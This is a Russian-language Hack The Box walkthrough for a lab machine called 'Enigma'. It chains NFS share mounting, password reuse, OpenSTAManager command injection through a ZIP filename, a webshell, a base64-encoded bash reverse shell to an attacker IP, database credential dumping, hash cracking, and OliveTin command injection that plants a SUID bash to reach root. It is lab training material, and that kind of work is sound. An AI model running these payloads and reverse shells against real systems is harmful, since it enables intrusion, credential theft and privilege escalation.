@@ -1,3 +1,211 @@
+# Enigma — Hack The Box Walkthrough
+
+## 1. Разведка (Reconnaissance)
+
+**Полное сканирование портов:**
+```bash
 nmap -sC -sV -p- -oN nmap_full.txt enigma.htb
+```
 
+**Результат — открытые порты:**
+- `22` — SSH (OpenSSH 9.6, только публичные ключи, пароль отключён)
+- `80` — nginx, статичная визитка "Enigma Corp"
+- `110/143/993/995` — Dovecot (POP3/IMAP) — почтовый сервер
+- `111/2049` + `mountd`/`nlockmgr` — NFS
 
+## 2. Первая точка входа — NFS
+
+```bash
+showmount -e enigma.htb
+# Export list for enigma.htb:
+# /srv/nfs/onboarding *
+```
+
+Шара открыта для всех (`*`, без ограничений) — монтируем:
+```bash
+mkdir /tmp/nfs_enigma
+sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs_enigma -o nolock
+ls -la /tmp/nfs_enigma
+```
+
+Находим `New_Employee_Access.pdf`:
+```bash
+pdftotext /tmp/nfs_enigma/New_Employee_Access.pdf -
+```
+
+**Получаем креды:**
+- Username: `kevin`
+- Password: `Enigma2024!`
+- Webmail: `http://mail001.enigma.htb`
+
+## 3. Почта Kevin → письмо от Sarah
+
+Добавляем поддомен в hosts:
+```
+10.129.239.191    enigma.htb mail001.enigma.htb
+```
+
+Проверяем креды через IMAP:
+```bash
+curl -k 'imaps://enigma.htb' --user 'kevin:Enigma2024!'
+curl -k 'imaps://enigma.htb/INBOX' --user 'kevin:Enigma2024!'
+```
+
+В INBOX находим приветственное письмо от **Sarah** (`sarah@enigma.htb`) — подсказка, что пароль мог переиспользоваться у других сотрудников.
+
+## 4. Password reuse → доступ Sarah → ещё одни креды
+
+Логинимся в Roundcube (`http://mail001.enigma.htb`) под `sarah:Enigma2024!` (тот же временный пароль). В её почте находим письмо от IT про доступ к **OpenSTAManager**:
+
+- URL: `http://support_001.enigma.htb`
+- Username: `admin`
+- Password: `Ne3s4rtars78s`
+
+## 5. Идентификация CVE в OpenSTAManager
+
+Добавляем домен в hosts, логинимся, смотрим версию через `/info.php`:
+```
+Version: 2.9.8
+```
+
+Находим **CVE-2025-69212** — OS Command Injection через P7M-файлы в плагине импорта электронных счетов (`GHSA-25fp-8w8p-mx36`). Уязвимость в функции `decodeP7M()` — имя файла из ZIP-архива передаётся в `exec()` без экранирования кавычек.
+
+## 6. Эксплуатация RCE через ZIP с вредоносным именем файла
+
+Собираем ZIP-архив, где имя файла внутри содержит command injection payload (через `zipfile` в Python), загружаем через раздел **Sales → Sales invoices → Importazione FE**.
+
+После загрузки — ошибка XML-парсинга (`Start tag expected, '<' not found`) означает, что команда уже выполнилась до падения парсера. Подтверждаем RCE:
+```bash
+curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+## 7. Получение полноценного reverse shell
+
+```bash
+# Листенер
+nc -lvnp 4444
+
+# Payload в base64
+echo -n 'bash -i >& /dev/tcp/10.10.14.160/4444 0>&1' | base64 -w0
+
+# Отправка через вебшелл
+curl -G "http://support_001.enigma.htb/files/SHELL.php" --data-urlencode 'c=echo <base64> | base64 -d | bash'
+```
+
+**Стабилизация шелла:**
+```bash
+script /dev/null -c bash
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+## 8. Поиск кредов в конфиге приложения
+
+```bash
+cat /var/www/html/openstamanager/config.inc.php
+```
+```
+$db_username = 'brollin';
+$db_password = 'Fri3nds@9099';
+```
+
+## 9. Доступ к MySQL → хеши системных пользователей
+
+```bash
+mysql -u brollin -p'Fri3nds@9099' openstamanager
+```
+```sql
+SELECT username, password FROM zz_users;
+```
+
+Получаем bcrypt-хеш пользователя `haris`.
+
+## 10. Брутфорс хеша
+
+```bash
+hashcat -m 3200 haris-hash /usr/share/wordlists/rockyou.txt --force
+```
+Результат: `haris:bestfriends`
+
+## 11. Переход на пользователя haris (user flag)
+
+```bash
+su haris
+cat ~/user.txt
+```
+
+## 12. Enumeration для privesc — находим OliveTin
+
+```bash
+ps aux | grep root
+```
+Видим `/usr/local/bin/OliveTin` — работает от root, веб-интерфейс автоматизации на `127.0.0.1:1337`.
+
+```bash
+cat /etc/OliveTin/config.yaml
+```
+
+Находим уязвимое действие:
+```yaml
+- title: Backup Database
+  id: backup_database
+  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
+```
+
+Параметр `db_pass` подставляется в shell без экранирования одинарных кавычек — классическая command injection.
+
+## 13. Изучение API OliveTin
+
+```bash
+curl -s -X POST "http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/GetDashboard" -H 'Content-Type: application/json' --data '{}'
+```
+Находим `bindingId: backup_database` и список аргументов (`db_user`, `db_pass`, `db_name`).
+
+Тестовый вызов подтверждает, что параметры доходят до shell без фильтрации:
+```bash
+curl -X POST "http://127.0.0.1:1337/api/StartAction" -H "Content-Type: application/json" -d '{"bindingId": "backup_database", "arguments": [{"name": "db_user", "value": "test"}, {"name": "db_pass", "value": "test"}, {"name": "db_name", "value": "test"}]}'
+```
+Ошибка в логах (`cannot create /opt/backups/backup.sql: Directory nonexistent`) подтверждает, что `mysqldump` реально выполнился.
+
+## 14. Эксплуатация — SUID bash через command injection
+
+```bash
+cat > /tmp/backdoor.json <<'JSON'
+{
+  "actionId": "backup_database",
+  "arguments": [
+    {"name": "db_user", "value": "backup_svc"},
+    {"name": "db_pass", "value": "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"},
+    {"name": "db_name", "value": "production"}
+  ]
+}
+JSON
+
+curl -s -X POST -H 'Content-Type: application/json' \
+  --data @/tmp/backdoor.json \
+  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait | jq .
+```
+
+**Разбор payload:** `x'` закрывает одинарную кавычку → `;` разделяет команды → `install -m 4755 /bin/bash /tmp/.bs` копирует bash с SUID-битом → `;` → `#` комментирует весь хвост оригинальной команды, избегая синтаксической ошибки.
+
+## 15. Root
+
+```bash
+/tmp/.bs -p
+whoami   # root
+cat /root/root.txt   # <ROOT_FLAG>
+```
+
+Флаг `-p` у bash важен — он не даёт bash сбросить эффективный UID обратно до реального при запуске SUID-копии.
+
+---
+
+## Ключевые уроки машины
+
+1. **NFS без ограничений** — частая точка входа, всегда проверяй `showmount -e`.
+2. **Password reuse** — временные пароли сотрудники редко меняют, пробуй один пароль на разных юзернеймах.
+3. **CVE-хантинг по версии ПО** — определи версию → ищи конкретный advisory, а не слепой брутфорс эксплойтов.
+4. **Command injection через шаблонизацию** — везде, где пользовательский ввод подставляется в shell-команду через `{{ }}`-синтаксис без санитизации, ищи способ вырваться из кавычек.
+5. **Привилегированные локальные сервисы** (как OliveTin на 127.0.0.1) — классический вектор privesc, если в них есть доступная конфигурация с похожими уязвимостями.
